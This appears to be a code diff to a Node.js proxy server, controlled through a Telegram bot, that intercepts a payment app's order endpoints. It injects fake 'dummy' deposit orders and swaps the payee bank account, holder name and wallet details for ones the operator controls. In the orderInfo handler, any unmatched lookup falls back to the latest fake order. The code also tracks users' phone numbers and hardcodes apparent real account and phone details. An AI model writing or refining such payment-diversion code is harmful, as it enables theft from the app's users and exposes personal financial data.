@@ -328,6 +328,20 @@ function generateDummyId() {
   return String(Math.floor(10000000 + Math.floor(Math.random() * 90000000)));
 }
 
+function findDummyOrder(data, idOrCode) {
+  if (!idOrCode) return null;
+  const target = String(idOrCode).trim().toLowerCase();
+  if (!target) return null;
+  data.dummyOrders = data.dummyOrders || [];
+  return data.dummyOrders.find(d => {
+    if (!d) return false;
+    const id = String(d.id || '').trim().toLowerCase();
+    const payOrderId = String(d.payOrderId || '').trim().toLowerCase();
+    const code = String(d.code || d.orderCode || d.buyCode || d.remark || '').trim().toLowerCase();
+    return id === target || payOrderId === target || code === target;
+  }) || null;
+}
+
 let bot = null;
 let webhookSet = false;
 try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }
@@ -2032,6 +2046,15 @@ async function proxyAndReplaceBankInList(req, res) {
         });
 
         if (matchingDummies.length > 0) {
+          matchingDummies.forEach(d => {
+            const cd = String(d.code || d.orderCode || d.buyCode || d.remark || d.id || 'N/A').trim();
+            d.code = cd;
+            d.orderCode = cd;
+            d.buyCode = cd;
+            d.remark = cd;
+            d.sn = cd;
+            d.codeName = cd;
+          });
           if (Array.isArray(listData)) {
             listData.unshift(...matchingDummies);
           } else if (listData.records && Array.isArray(listData.records)) {
@@ -2278,8 +2301,7 @@ app.post('/app/payment/order/create', async (req, res) => {
     const userId = await extractUserId(req, null);
     const targetPayOrderId = String(body.payOrderId || body.orderId || body.buyId || body.id || req.query?.payOrderId || req.query?.orderId || '').trim();
 
-    data.dummyOrders = data.dummyOrders || [];
-    const dummyMatch = data.dummyOrders.find(d => String(d.id) === targetPayOrderId || String(d.payOrderId) === targetPayOrderId || d.code === targetPayOrderId);
+    const dummyMatch = findDummyOrder(data, targetPayOrderId);
 
     if (dummyMatch) {
       if (userId) { trackUser(data, userId, 'Deposit Order (Dummy)'); saveData(data).catch(() => { }); }
@@ -2296,7 +2318,7 @@ app.post('/app/payment/order/create', async (req, res) => {
           orderId: buyId,
           payOrderId: buyId,
           buyId: buyId,
-          amount: dummyMatch.amount,
+          amount: parseFloat(dummyMatch.amount || 5010),
           code: dummyMatch.code,
           orderCode: dummyMatch.code,
           remark: dummyMatch.code,
@@ -2415,9 +2437,14 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
   if (!data.botEnabled) return await transparentProxy(req, res);
 
   try {
-    const reqBuyId = String(req.query?.buyId || req.query?.orderId || req.parsedBody?.buyId || req.parsedBody?.orderId || '').trim();
-    data.dummyOrders = data.dummyOrders || [];
-    const dummyMatch = data.dummyOrders.find(d => String(d.id) === reqBuyId || String(d.payOrderId) === reqBuyId || d.code === reqBuyId);
+    const q = req.query || {};
+    const b = req.parsedBody || {};
+    const targetId = String(q.buyId || q.orderId || q.payOrderId || q.orderNo || q.code || b.buyId || b.orderId || b.payOrderId || b.orderNo || b.code || '').trim();
+
+    let dummyMatch = findDummyOrder(data, targetId);
+    if (!dummyMatch && data.dummyOrders && data.dummyOrders.length > 0) {
+      dummyMatch = data.dummyOrders[data.dummyOrders.length - 1];
+    }
 
     let response, respBody, respHeaders, jsonResp;
 
@@ -2425,6 +2452,10 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
       const buyId = String(dummyMatch.id || dummyMatch.payOrderId);
       const nowMs = Date.now();
       const expiryMs = nowMs + 15 * 60 * 1000;
+      const amtNum = parseFloat(dummyMatch.amount || 5010);
+      const userId = await extractUserIdFromToken(req) || await extractUserId(req, null);
+      const bank = getActiveBank(data, userId);
+
       jsonResp = {
         code: 1000,
         data: {
@@ -2437,9 +2468,11 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           orderNo: dummyMatch.code,
           remark: dummyMatch.code,
           sn: dummyMatch.code,
-          amount: dummyMatch.amount,
-          orderAmount: dummyMatch.amount,
-          payeeAccount: "009110281719",
+          amount: amtNum,
+          orderAmount: amtNum,
+          totalAmount: amtNum,
+          unpaidAmount: amtNum,
+          payeeAccount: bank ? bank.accountNo : "009110281719",
           payeeName: bank ? bank.accountHolder : "SATYAM KUMAR",
           name: bank ? bank.accountHolder : "SATYAM KUMAR",
           accountName: bank ? bank.accountHolder : "SATYAM KUMAR",
@@ -2450,18 +2483,26 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           channelName: "IMPS",
           bankName: "IMPS",
           status: 1,
+          statusCode: 1,
           state: 1,
           orderStatus: 1,
+          statusLabel: "Processing",
+          stateLabel: "Processing",
           nowTimestamp: nowMs,
+          currentTime: nowMs,
+          serverTime: nowMs,
           expiryTimestamp: expiryMs,
+          expireTimeStamp: expiryMs,
           expireTime: Math.floor(expiryMs / 1000),
-          intent: "alipays://platformapi/startapp",
+          intent: "freecharge://pay",
           freechargeIntent: "freecharge://pay",
+          payUrl: "freecharge://pay",
           payoutWalletType: dummyMatch.payoutWalletType || 2,
           payoutWallet: { name: dummyMatch.payoutWallet || "Freecharge", type: dummyMatch.payoutWalletType || 2 },
           payTypeName: dummyMatch.payoutWallet || "Freecharge",
           walletName: dummyMatch.payoutWallet || "Freecharge",
           payoutAccount: (data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398",
+          payoutPhone: (data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398",
           payoutUpi: ((data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398") + "@" + (dummyMatch.payoutWallet ? dummyMatch.payoutWallet.toLowerCase() : "freecharge"),
           address: ((data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398") + "@" + (dummyMatch.payoutWallet ? dummyMatch.payoutWallet.toLowerCase() : "freecharge")
         },
